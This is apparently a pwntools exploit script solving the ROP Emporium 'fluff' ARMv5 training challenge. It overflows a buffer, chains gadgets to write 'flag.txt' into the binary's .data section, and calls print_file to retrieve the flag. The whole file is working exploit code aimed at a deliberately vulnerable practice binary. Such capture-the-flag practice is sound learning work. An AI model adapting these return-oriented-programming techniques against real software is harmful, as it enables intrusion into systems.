#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# ropemporium ARMv5 fluff
# Set up pwntools for the correct architecture
elf = context.binary = ELF('fluff_armv5')

# 164 : read
# 176 : ret
gs='''
b *pwnme+176
'''

# Gadgets
# En mode 32
# pop {r4, r5, r6, r7, r8, sb, sl, pc}
g_pop_r45678 = 0x010658

# pop {r0, r1, r3}; bx r1
g_pop_r013_bxr1 = 0x000105ec

# pop {r3, pc}
g_pop_r3 = 0x00010474 

# 0x000105c8 : mov r0, r3 ; pop {fp, pc}
g_mov_r0r3 = 0x000105c8 

# En mode thumb
# str r6, [r5, #0x44] ; bx r0 
g_str_r6r5_bxr0 = 0x000103ea

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])

data = elf.get_section_by_name('.data').header['sh_addr']
print_file = elf.plt['print_file']
#main=elf.symbols['unusefulFunction']

log.info(f".data       = 0x{data}")
log.info(f".print_file = 0x{print_file}")

io.recvuntil(b"> ")


offset=0x24

flagfile=b"flag.txt"

PL=b"A"*offset
# "flag"
PL+=p32(g_pop_r45678)
PL+=p32(0)               # r4
PL+=p32(data-0x44)       # r5 
PL+=flagfile[:4]         # r6
PL+=p32(0)               # r7
PL+=p32(0)               # r8
PL+=p32(0)               # sb
PL+=p32(0)               # sl
PL+=p32(g_pop_r013_bxr1) # pc
PL+=p32(g_pop_r45678)    # r0
PL+=p32(g_str_r6r5_bxr0+1) # r1
PL+=p32(0)               # r3 fake

# ".txt"
PL+=p32(0)               # r4
PL+=p32(data+4-0x44)     # r5 
PL+=flagfile[4:8]        # r6
PL+=p32(0)               # r7
PL+=p32(0)               # r8
PL+=p32(0)               # sb
PL+=p32(0)               # sl
PL+=p32(g_pop_r013_bxr1) # pc
PL+=p32(g_pop_r3)    # r0 : gadget suivant
PL+=p32(g_str_r6r5_bxr0+1) # r1
PL+=p32(0)               # r3 fake

# appel de print_file
PL+=p32(data)            # consommé par pop r3
PL+=p32(g_mov_r0r3)      # mov r0,r3; pop{r11,pc}
PL+=p32(0)               # pour r11 
PL+=p32(print_file)

io.sendline(PL)

io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()

